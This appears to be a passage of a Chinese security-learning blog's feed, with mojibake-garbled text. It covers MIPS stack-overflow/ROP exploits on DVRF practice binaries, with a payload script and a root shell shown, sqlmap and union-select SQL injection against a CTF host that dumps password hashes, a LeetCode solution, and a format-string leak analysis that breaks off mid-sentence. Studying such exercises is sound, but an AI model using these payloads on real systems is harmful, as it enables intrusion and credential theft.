&quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; æ­¤å¤„mainå‡½æ•°æ˜Žæ˜¾æ˜¯éžå¶å­å‡½æ•°ï¼Œæˆ‘ä»¬è¦æƒ³åŠžæ³•è°ƒç”¨do_system_0è¿™ä¸ªå‡½æ•°é‚£å°±è¦æƒ³åŠžæ³•æŽ§åˆ¶$a1å¯„å­˜å™¨ï¼Œé‚£æ ·å°±å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ mipsrop.stackfinder()æŸ¥æ‰¾gadget æˆ‘ä»¬é€‰æ‹©0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) è¦åšåˆ°è·³è½¬åˆ°æˆ‘ä»¬çš„gadgetï¼Œéœ€è¦è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ å…ˆè®¡ç®—è¦paddingçš„é•¿åº¦ æ­¤æ—¶è®¡ç®—å‡ºæ¥çš„patternæ˜¯412ï¼Œä¼šä¸ä¼šå¤ªé•¿äº†ç‚¹(æ³¨ï¼šåœ¨æˆ‘å‚è€ƒçš„æ–‡ç« ä¸­ä½œè€…è®¡ç®—å‡ºæ¥çš„åç§»å’Œæˆ‘çš„ä¸ä¸€æ ·ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±è®¡ç®—é”™äº†ï¼Œä½†æ˜¯åŽæ¥è°ƒè¯•åŽè®¤ä¸ºè‡ªå·±å¹¶æ²¡æœ‰ç®—é”™) æŽ¥ä¸‹æ¥æˆ‘å°è¯•å…ˆè¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€è·³è½¬åˆ°ropçš„ç©ºé—´ï¼Œå†å°†/bin/shå­—ç¬¦ä¸²çš„åœ°å€èµ‹å€¼ç»™$a1 $raè¢«è¦†ç›– f7å•æ­¥ä¸€æ¬¡ï¼Œè·³è½¬åˆ°gadgetè€Œä¸”æ­¤æ—¶æ ˆç©ºé—´å·²ç»å¸ƒç½®å¥½äº†addiu $a1, $sp, 0x58+var_40ç›¸å½“äºŽ $a1 = $sp+0x18 æ­¤æ—¶$sp+0x18å­˜æ”¾çš„å°±æ˜¯/bin/shå­—ç¬¦ä¸²çš„åœ°å€ ç„¶è€Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¸ªé”™è¯¯å°±å¾ˆä¸æ˜Žä¸ç™½äº† é‡æ–°å›žé¡¾äº†ä¸€ä¸‹ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´žæŒ–æŽ˜æŠ€æœ¯ã€‹ï¼Œçœ‹åˆ°äº†ä½œè€…å†™çš„ä¸€ä¸ªexpå°†gadgetçš„åœ°å€æ›¿æ¢æˆæˆ‘çš„ï¼Œå¦‚ä¸‹ï¼š12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadgetåœ°å€ï¼Œä½œè€…å†™çš„æ˜¯&quot;&lt;L&quot;ä½†æ˜¯æˆ‘å°è¯•ä¹‹åŽå‘çŽ°åœ°å€æ˜¯åçš„ï¼Œæ‰€ä»¥æ¢è¿‡æ¥äº†shellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0å‡½æ•°åœ°å€shellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; ç”Ÿæˆpasswdæ–‡ä»¶ä¹‹åŽï¼Œ./qemu-mipsel-static -g 1234 ./vuln_systemè¿›è¡Œè°ƒè¯•å½“ç¨‹åºè·³è½¬åˆ°gadgetæ—¶ï¼Œå˜æˆäº†è¿™æ ·ï¼Œ æ­¤æ—¶çœ‹ç»ˆç«¯ï¼šæˆ‘å±…ç„¶æˆåŠŸäº†ï¼Ÿï¼Ÿæ­¤æ—¶å·²ç»æ‹¿åˆ°äº†rootæƒé™ ç¡®å®žæ²¡æœ‰çœ‹é”™ï¼Œé‡æ–°è¿è¡Œä¸€éç¨‹åºï¼Œç¡®å®žæ‹¿åˆ°äº†shellæƒé™ DVRF ç»ƒä¹ è¿™ä¸ªåœ¨attifyOSä¸Šå·²ç»ä¸‹è½½å¥½äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŽ»GitHubä¸Šcloneä¸€ä»½ï¼Œä¸€ä¸ªå¾ˆä¸é”™çš„é¡¹ç›® æ¥çœ‹Introçš„stack_bof_01ç¨‹åºä½äºŽ/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ æºç ä½äºŽ/home/oit/DVRF/Pwnable Source/Intro1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; æ˜¾ç„¶ä¹Ÿæ˜¯strcpyå‡½æ•°æ²¡æœ‰é™åˆ¶æ‹·è´çš„é•¿åº¦ è¿è¡Œå®ƒï¼š123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl æˆ‘ä»¬ç›´æŽ¥è®¡ç®—åç§»åœ°å€ ç”Ÿæˆé•¿åº¦ä¸º200çš„å­—ç¬¦ä¸² 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s é‚£æˆ‘ä»¬è¯•ä¸€è¯•ç›´æŽ¥å¡«å…… 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; æ­¤æ—¶å·²ç»å°†$raå¯„å­˜å™¨çš„å€¼è¦†ç›–æŽ‰äº†ä½†æ˜¯ åœ¨dat_shellå‡½æ•°ä¸­æŠ¥é”™äº†æ‰€ä»¥è¿™æ—¶å€™éœ€è¦å€ŸåŠ©gadget ä¹‹å‰å‚è€ƒäº†å‡ ç¯‡æ–‡ç« ï¼Œéƒ½æ˜¯é€šè¿‡æŸ¥æ‰¾libcçš„åŸºåœ°å€æ¥ç¡®è®¤gadgetåœ¨å†…å­˜ä¸­çš„åœ°å€çš„ï¼Œä½†æ˜¯æˆ‘å¼€å§‹è¦gdbè°ƒè¯•çš„æ—¶å€™å¹¶æ²¡æœ‰çœ‹åˆ°libc.so.0çš„åŠ è½½ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ€€ç–‘æ˜¯ä¸æ˜¯æ²¡åŠ è½½ï¼Œç„¶åŽç„¶åŽï¼Œçœ‹åˆ°åŽŸç¨‹åºä¸­æ˜¯æœ‰putså’Œmemsetè¿™äº›å‡½æ•°çš„ï¼Œé‚£æ˜¾ç„¶æ˜¯åŠ è½½äº†çš„äºŽæ˜¯ä¸‹ä¸€ä¸ªæ–­ç‚¹ç„¶åŽè°ƒè¯• ç»ˆäºŽæ‰¾åˆ°äº†libcçš„åŠ è½½åŸºå€ è¿™æ ·å°±å¥½åŠžäº†python -c &quot;print &#39;a&#39;*204+&#39;\x20\x1b\x8a\x40&#39;+&#39;\x50\x09\x40\x00&#39;&quot; &gt; test ä¹‹åŽè¿è¡Œ okå·²ç»æˆåŠŸäº†ï¼ï¼ï¼1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ï¿½@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl ä¸è¿‡ä¸ºå•¥ç”¨mipsropæ‰¾ä¸åˆ°è¿™ä¸ªgadgetå‘¢ï¼Ÿå¾ˆç–‘æƒ‘ ç¡®è®¤libcåŸºå€çš„æ–¹æ³•å¤§æ¦‚æœ‰ï¼š vmmap cat /proc/pid/mapsæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜åˆ†å¸ƒ åœ¨IDAä¸­æŸ¥æ‰¾åˆ°å‡½æ•°çœŸæ­£åŠ è½½çš„ä½ç½®ï¼Œç„¶åŽè®¡ç®—åç§» å‚è€ƒè·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆä¸€ï¼‰(æ„Ÿè§‰è¿™ç¯‡æ–‡ç« ä¸­ç¬¬äºŒä¸ªç¨‹åºè°ƒè¯•çš„ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œå› ä¸ºåç§»è®¡ç®—çš„éƒ½ä¸ä¸€æ ·)è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆäºŒï¼‰]]></content>
  </entry>
  <entry>
    <title><![CDATA[ä¸¤é“sqlæ³¨å…¥é¢˜]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[åŸºäºŽsqlçš„ç›²æ³¨ä¹‹å‰ä¸€ç›´æ²¡æœ‰å¥½å¥½åœ°å­¦ä¹ è¿‡sqlmapçš„ä½¿ç”¨æ–¹æ³• å¦‚æžœæ˜¯é’ˆå¯¹postè¡¨å•è¿™ç§æ–¹å¼ å¯ä»¥å°†æŠ“åˆ°çš„åŒ…ä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åŽä½¿ç”¨ sqlmap.py -r &quot;post.txt&quot; -p n --dbs å…¶ä¸­-pæ˜¯æŒ‡å®šå‚æ•° sqlmapä¹Ÿå¯ä»¥è‡ªåŠ¨æœå¯»è¡¨å•sqlmap.py -u &quot;url&quot; --forms æŒ‡å®šå‚æ•° è¶æœºå­¦åˆ°äº†ä¸€æŠŠsqlmapä½¿ç”¨è™½ç„¶è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰ç‚¹ã€‚ã€‚ä½†æ˜¯æ³¨å…¥ç‚¹çš„åˆ¤æ–­ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ çˆ†åŽç«¯æ•°æ®åº“python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; çˆ†æ•°æ®åº“python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs æŒ‡å®šæ•°æ®åº“æŠ¥è¡¨çˆ†è¡¨python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables æŒ‡å®šæ•°æ®åº“å’Œè¡¨çˆ†å­—æ®µpython sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œå­—ç¬¦ç„¶åŽdumpå‡ºæ•°æ®python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ è§£å¯†ä¹‹åŽæ˜¯106370è¿™æ ·å°±èƒ½ç™»é™†åŽå°äº†å¤ªç¥žå¥‡äº† å‚è€ƒsqlmapä¹‹(å…­)â€”â€”POSTç™»é™†æ¡†æ³¨å…¥å®žæˆ˜ SQLæ‰‹å·¥æ³¨å…¥æ¼æ´žæµ‹è¯•(Accessæ•°æ®åº“)è¿™é“é¢˜ç›®å°±æœ‰ç‚¹ç¥žå¥‡äº† çº¯é çŒœ order by 4åˆ¤æ–­æœ‰å¤šå°‘ä¸ªå­—æ®µ ç„¶åŽ new_list.asp?id=1 and exists(select * from admin)åˆ¤æ–­æ˜¯å¦å­˜åœ¨admin æŽ¥ä¸‹æ¥åˆ¤æ–­å›žæ˜¾ä½ç½®/new_list.asp?id=1 union select 1,2,3,4 from admin æŽ¥ä¸‹æ¥çŒœæµ‹å­—æ®µå€¼and exists (select id from admin) çˆ†å‡ºå­—æ®µå€¼union select 1,username,passwd,id from admin md5è§£å¯†ä¸€ä¸‹ç™»é™†å°±è¡Œäº† å‚è€ƒ]]></content>
      <categories>
        <category>mozhe</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[é”™è§£æ€Žä¹ˆå¿«é€Ÿåœ°å°†é“¾è¡¨å€’ç½® :confused: æœ€åŽè¿˜æ˜¯å› ä¸ºæº¢å‡ºçš„é—®é¢˜ æ€è·¯ï¼š 12345678910111213141516171819202122â€‹ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; å°±æ˜¯å°†å…¶è½¬åŒ–ä¸ºæ•´æ•°ï¼Œå› ä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æœ€ä½Žä½ï¼Œä¹‹åŽæ˜¯åä½ï¼Œç™¾ä½ç­‰ å°†å¾—åˆ°çš„ç»“æžœåœ¨è½¬åŒ–ä¸ºé“¾è¡¨ 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //å…ˆå–ä¸€ä¸ªå¤´èŠ‚ç‚¹ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; è®°å½•ä¸€ä¸‹å°†æ•´æ•°è½¬ä¸ºstringçš„æ“ä½œ Integer.toString(result) Math.powå‡½æ•°çš„è¿”å›žå€¼å¿…é¡»æ˜¯doubleç±»åž‹çš„ ä½†æ˜¯è¿™æ ·ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å›¾ç‰‡çš„é‚£ä¸ªï¼Œæº¢å‡ºï¼ æ­£è§£çœ‹äº†çœ¼ç­”æ¡ˆï¼Œæ‰æ˜Žç™½è‡ªå·±ä»Žå¼€å§‹å°±æƒ³é”™äº† 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; æœ€å…³é”®çš„å°±æ˜¯ ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== å…¶å®žåªéœ€è¦ä»Žä½Žä½å¼€å§‹ä¸€ä½ä½çš„åŠ ä¸ŠåŽ»å°±å¥½äº†ã€‚ ç„¶åŽå†æŠŠå®ƒä»¬ç»™é“¾èµ·æ¥]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ†æž]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿™ä¸ªé¢˜ç›®æ˜¯ctfwikiä¸Šçš„ cä»£ç å¦‚ä¸‹ï¼š 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; ï¼ˆçªç„¶å‘çŽ°è…¾è®¯æ–‡æ¡£å±…ç„¶è¿˜æ”¯æŒä»£ç å¥½å¼ºå•Š æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸‹ï¼š 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g æŠŠä¿æŠ¤æŽªæ–½éƒ½å…³æŽ‰äº† 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å…ˆçœ‹ä¸€ä¸‹å‡ ä¸ªpayload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. åœ¨printfå¤„ä¸‹æ–­ç‚¹æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ 12345600:0000â”‚ esp 0xffffcf9c â€”â–¸ 0x80484ea (main+100) â—‚â€” add esp, 0x2001:0004â”‚ 0xffffcfa0 â€”â–¸ 0x8048593 â—‚â€” and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008â”‚ 0xffffcfa4 â—‚â€” 0x103:000câ”‚ 0xffffcfa8 â—‚â€” 0x22222222 ('""""')04:0010â”‚ 0xffffcfac â—‚â€” 0xffffffff05:0014â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x' continueä¸€ä¸‹ï¼š 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c è¾“å‡ºäº†ä¿¡æ¯çš„åŒæ—¶ï¼Œ å‘½ä¸­ç¬¬äºŒä¸ªæ–­ç‚¹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'06:0018â”‚ 0xffffcfc4 â—‚â€” '.%08x.%08x'07:001câ”‚ 0xffffcfc8 â—‚â€” 'x.%08x' æ­¤æ—¶printfå‡½æ•°ä¼šæŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„æ ˆä¸Šçš„ä¿¡æ¯å½“ä½œå‚æ•°æ‰“å°å‡ºæ¥ï¼šcontiueä¸€ä¸‹ 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] ä¹‹å‰æ ˆä¸Šçš„ä¿¡æ¯æ˜¾ç¤ºçš„ä¸å…¨ï¼Œæ ˆçš„å†…å­˜å¦‚ä¸‹ï¼š 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ æˆ‘ä»¬çœ‹åˆ°æ­¤æ—¶printfå‡½æ•°å°†0xffffcfc0 0xf7fcf410 0x0804849déƒ½æ‰“å°å‡ºæ¥äº†ï¼Œ ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„ä¸‰ä¸ªä½ç½®çš„ä¿¡æ¯ æˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼æ³„éœ²æ ˆçš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æŽ¥åŽ»å–å¾—æ ˆä¸­è¢«è§†ä¸ºç¬¬n+1ä¸ªå‚æ•°çš„å€¼è‡³äºŽä¸ºä»€ä¹ˆæ˜¯ç¬¬n+1, è¿™æ˜¯å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬ä¸€ä¸ªå‚æ•° æ¯”å¦‚ é€šè¿‡ %3\$x(è¿™ä¸ªçš„åŽŸç†æ˜¯å•¥ï¼Ÿä¸ºä»€ä¹ˆè¦åŠ \$ç¬¦å·) æˆ‘ä»¬å¯ä»¥æ³„éœ²æ ˆä¸Šè¢«è§†ä¸ºç¬¬4ä¸ªå‚æ•°çš„å€¼ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š(å·¦è¾¹çš„ä¸€åˆ—æ˜¯æ ˆåœ°å€ï¼Œä¹Ÿå°±æ˜¯å†…å­˜çš„åœ°å€ï¼Œç®­å¤´ä»£è¡¨äº†è¿™ä¸ªå†…å­˜å•å…ƒå­˜å‚¨çš„æ•°æ®ï¼Œå¦‚æžœæ˜¯æŒ‡é’ˆè¿˜ä¼šè¿›ä¸€æ­¥æŒ‡ç¤º) 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%3$x'... â†“(è¿™é‡Œæ˜¯çœç•¥å·ï¼Œæ˜¯ä¸æ˜¯å°±æ˜¯ç›´æŽ¥æŒ‡å‘äº†ï¼Œä¸­é—´é‚£ä¸ªå°±è¢«è·³è¿‡äº†)03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%3$x'06:0018â”‚ 0xffffcfc4 â—‚â€” 0x007:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 åŒæ ·çœ‹ä¸æ¸…ï¼Œ è¿˜æ˜¯ç›´æŽ¥æ‰“å°å†…å­˜ä¿¡æ¯å§(xå‘½ä»¤çš„ç”¨æ³•ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯å†…å­˜åœ°å€ä»Ž0xffffcfb0å¼€å§‹çš„ï¼Œå› ä¸ºå†…å­˜æ˜¯æŒ‰ç…§å­—èŠ‚ç¼–å€çš„ï¼Œæ‰€ä»¥ä¸€è¡Œæ­£å¥½æ˜¯16ä¸ªå­—èŠ‚å†…å­˜åœ°å€å°±æ˜¯åŠ 10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0è¿™ä¸ªå†…å­˜å•å…ƒæŒ‡å‘äº†0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (çœ‹å†…å­˜å•å…ƒ0xffffcfc0å­˜æ”¾çš„å†…å®¹å°±æ˜¯x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 çŒœçŒœè¿™æ—¶å€™æ‰“å°çš„ä¿¡æ¯æ˜¯å•¥ï¼Ÿç­”æ¡ˆæ˜¯æ ˆä¸Šè¢«è§†ä¸ºç¬¬å››ä¸ªå‚æ•°çš„ä¿¡æ¯ï¼š 0x0804849d åŒæ ·çš„æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡%sæ¥å¾—åˆ°å­—ç¬¦ä¸²çš„ä¿¡æ¯ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */06:0018â”‚ 0xffffcfc4 â—‚â€” 0x107:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 è¿˜æ˜¯çœ‹ä¸æ¸…ï¼Œç›´æŽ¥çœ‹å†…å­˜å§(md åžƒåœ¾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 è¿™ä¸ªæ—¶å€™ä¼šç›´æŽ¥å°† 0xffffcfc0 å¯¹åº”çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ç»“æžœè‡ªç„¶å°±æ˜¯ %säº† å¦‚æžœæˆ‘ä»¬è¾“å…¥%2$s, è¿™ä¸ªæ—¶å€™å°±å¾ˆæœ‰è¶£äº†ï¼Œ æŒ‰ç…§é“ç†ç¨‹åºä¼šå°† 0xf7fcf410 å¯¹åº”åœ°å€çš„å½“ä½œå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ï¼Œ å¯æ˜¯å¦‚æžœè¿™ä¸ªåœ°å€æ— 